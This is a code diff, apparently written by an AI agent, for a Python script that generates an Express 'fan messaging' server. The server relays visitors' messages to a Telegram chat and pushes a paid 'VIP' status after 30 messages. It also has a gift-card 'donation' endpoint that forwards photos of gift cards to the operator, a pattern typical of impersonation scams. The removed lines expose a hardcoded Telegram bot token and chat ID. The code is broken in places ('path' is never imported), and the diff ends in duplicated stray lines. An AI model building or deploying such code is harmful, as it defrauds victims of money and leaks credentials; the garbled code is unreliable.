@@ -1,4 +1,6 @@
-server_js_content = '''const express = require('express');
+
+# Create server.js
+server_js = '''const express = require('express');
 const cors = require('cors');
 const bodyParser = require('body-parser');
 const axios = require('axios');
@@ -8,33 +10,176 @@ require('dotenv').config();
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Telegram Bot Configuration
-const BOT_TOKEN = process.env.BOT_TOKEN || '8740257888:AAEAq1XFJfzDETV91Qt2EWdf0OUvLcD86Hg';
-const CHAT_ID = process.env.CHAT_ID || '8425923232';
+const BOT_TOKEN = process.env.BOT_TOKEN;
+const CHAT_ID = process.env.CHAT_ID;
 const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
-// In-memory storage (use Redis in production)
 const sessions = new Map();
 const userMessages = new Map();
 const vipUsers = new Set();
 
 app.use(cors());
-app.use(bodyParser.json());
-app.use(bodyParser.urlencoded({ extended: true }));
+app.use(bodyParser.json({ limit: '10mb' }));
+app.use(bodyParser.urlencoded({ extended: true, limit: '10mb' }));
 app.use(express.static('public'));
 
-// Generate unique session ID
 function generateSessionId() {
-    return 'fan_' + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
+    return 'fan_' + Math.random().toString(36).substring(2, 15);
 }
 
-// Send message to Telegram
 async function sendToTelegram(message, photo = null) {
     try {
         if (photo) {
             await axios.post(`${TELEGRAM_API}/sendPhoto`, {
                 chat_id: CHAT_ID,
                 photo: photo,
+                caption: message,
+                parse_mode: 'HTML'
+            });
+        } else {
+            await axios.post(`${TELEGRAM_API}/sendMessage`, {
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            });
+        }
+        return true;
+    } catch (error) {
+        console.error('Telegram Error:', error.message);
+        return false;
+    }
+}
+
+app.post('/api/send-message', async (req, res) => {
+    const { message, userName, userEmail, sessionId } = req.body;
+    
+    if (!message) {
+        return res.status(400).json({ success: false, error: 'Message required' });
+    }
+
+    const sid = sessionId || generateSessionId();
+    const msgCount = (userMessages.get(sid) || 0) + 1;
+    userMessages.set(sid, msgCount);
+    
+    const isVip = vipUsers.has(sid);
+    const requireVip = msgCount > 30 && !isVip;
+    
+    const telegramMessage = `🚀 NEW FAN MESSAGE
+Session: ${sid}
+Message #${msgCount}
+Status: ${isVip ? 'VIP' : (requireVip ? 'REQUIRES VIP' : 'Free')}
+
+From: ${userName || 'Anonymous'}
+Email: ${userEmail || 'Not provided'}
+
+Message:
+${message}
+
+Reply to this message to respond to the fan on the website`;
+
+    const sent = await sendToTelegram(telegramMessage);
+    
+    if (sent) {
+        sessions.set(sid, {
+            lastMessage: new Date(),
+            messageCount: msgCount,
+            isVip: isVip,
+            pendingReply: null
+        });
+        
+        res.json({ 
+            success: true, 
+            sessionId: sid,
+            messageCount: msgCount,
+            requireVip: requireVip,
+            isVip: isVip
+        });
+    } else {
+        res.status(500).json({ success: false, error: 'Failed to send' });
+    }
+});
+
+app.post('/api/send-giftcard', async (req, res) => {
+    const { giftCardType, amount, photoData, userName, sessionId } = req.body;
+    
+    const telegramMessage = `🎁 GIFT CARD DONATION
+Session: ${sessionId || 'N/A'}
+From: ${userName || 'Anonymous'}
+Type: ${giftCardType}
+Amount: $${amount}`;
+
+    const sent = await sendToTelegram(telegramMessage, photoData);
+    
+    if (sent) {
+        res.json({ success: true });
+    } else {
+        res.status(500).json({ success: false });
+    }
+});
+
+app.get('/api/check-reply/:sessionId', (req, res) => {
+    const { sessionId } = req.params;
+    const session = sessions.get(sessionId);
+    
+    if (session && session.pendingReply) {
+        const reply = session.pendingReply;
+        session.pendingReply = null;
+        res.json({ hasReply: true, reply: reply });
+    } else {
+        res.json({ hasReply: false });
+    }
+});
+
+app.post('/api/upgrade-vip', (req, res) => {
+    const { sessionId } = req.body;
+    if (sessionId) {
+        vipUsers.add(sessionId);
+        const session = sessions.get(sessionId);
+        if (session) session.isVip = true;
+        res.json({ success: true });
+    } else {
+        res.status(400).json({ success: false });
+    }
+});
+
+app.post('/webhook', (req, res) => {
+    const update = req.body;
+    
+    if (update.message && update.message.reply_to_message) {
+        const originalText = update.message.reply_to_message.text || '';
+        const sessionMatch = originalText.match(/Session: (fan_[a-z0-9]+)/);
+        
+        if (sessionMatch) {
+            const sessionId = sessionMatch[1];
+            const replyText = update.message.text;
+            
+            const session = sessions.get(sessionId);
+            if (session) {
+                session.pendingReply = replyText;
+            }
+        }
+    }
+    
+    res.sendStatus(200);
+});
+
+app.get('/health', (req, res) => {
+    res.json({ status: 'ok' });
+});
+
+app.get('*', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
+
+app.listen(PORT, () => {
+    console.log(`Server running on port ${PORT}`);
+});
+'''
+
+with open('/mnt/kimi/output/server.js', 'w') as f:
+    f.write(server_js)
+
+print("✅ server.js created")                photo: photo,
                 caption: message,
                 parse_mode: 'HTML'
             });
